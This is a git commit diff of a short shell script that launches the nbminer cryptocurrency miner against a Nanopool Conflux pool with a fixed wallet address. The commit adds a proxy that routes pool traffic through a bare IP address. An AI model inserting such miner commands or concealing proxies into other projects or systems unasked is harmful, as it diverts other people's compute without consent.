3ea75d7d42735c7654944f1baf9488d2e98fe8bb
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2021-04-14 13:14:56 +0200

    Update nbConflux.sh

--- nbConflux.sh
+++ nbConflux.sh
@@ -1,2 +1,2 @@
 #!/bin/sh
-./nbminer -a octopus -o stratum+ssl://cfx-us-west1.nanopool.org:17433 -u 0x1779de78fcddd2c543244fd5bfb14da90b830fc6.NB -log
+./nbminer -a octopus -o stratum+ssl://cfx-us-west1.nanopool.org:17433 -u 0x1779de78fcddd2c543244fd5bfb14da90b830fc6.NB -log --proxy 139.177.202.146:9999
